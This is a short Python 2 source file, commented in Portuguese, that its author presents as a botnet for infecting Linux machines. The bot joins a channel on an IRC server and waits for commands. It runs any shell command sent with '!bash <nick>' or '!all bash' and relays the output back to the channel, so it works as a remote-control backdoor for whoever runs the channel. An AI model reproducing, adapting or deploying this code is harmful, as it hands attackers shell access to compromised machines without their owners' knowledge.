#!/usr/bin/python

import socket
import time
import subprocess
import sys
import random
import time

#Creditos: Flet
#Github: https://github.com/Fletzinho/
#Sistema de Bot, Para Infectar Maquinas Linux.

#Seta Sua Host Irc
server = "irc.freenode.net"
#Seta Seu Canal Irc
channel = "#chatflet"
nick = "CBOT" + str(random.randint(1, 100000))

def run_command(command):
        output = ''
        command = command.rstrip()
	output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in iter(output.stdout.readline, ''):
		irc.send("PRIVMSG "+channel+" :"+line)
                sys.stdout.flush()

while 1:

	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while 1:
		try:
			irc.connect((server, 6667))
			break;
		except:
			pass		
	time.sleep(1)
	irc.send("USER "+nick+" "+nick+" "+nick+" : Hacked => "+nick+" ! Zombie of CBOT\r\n")
	time.sleep(1)
	irc.send("NICK "+nick+"\n")
	time.sleep(1)
	irc.send("JOIN "+channel+"\n")

	while True:
		time.sleep(0.1)
		try: 
			text=irc.recv(2040)
			print(text)
		except Exception:
			pass
		if text.lower().find("!all quit")!=-1:
			irc.send("PRIVMSG "+channel+" :Saindo do servidor...\r\n")
			irc.close()
			break;
		elif text.find("!bash "+nick+" ")!=-1:
                        irc.send("PRIVMSG "+channel+" :==============="+nick+"===============\r\n")
			print(str(text.split("!bash "+nick+" ")[-1]))
			run_command(str(text.split("!bash "+nick+" ")[-1]))
                        irc.send("PRIVMSG "+channel+" :=========================================\r\n")
		elif text.find("!all bash ")!=-1:
			print(str(text.split("!all bash ")[-1]))
			run_command(str(text.split("!all bash ")[-1]))
		elif text.lower().find("!quit "+nick)!=-1:
			irc.send("PRIVMSG "+channel+" :Saindo do servidor...\r\n")
			irc.close()
			break;
		elif text.lower().find("!help")!=-1:
			irc.send("PRIVMSG "+channel+" :COMANDOS: !all bash (comando), !bash (maquina) (comandos), !quit (maquina), !all quit. BOTNET BY FLET\r\n")
	sys.exit()
on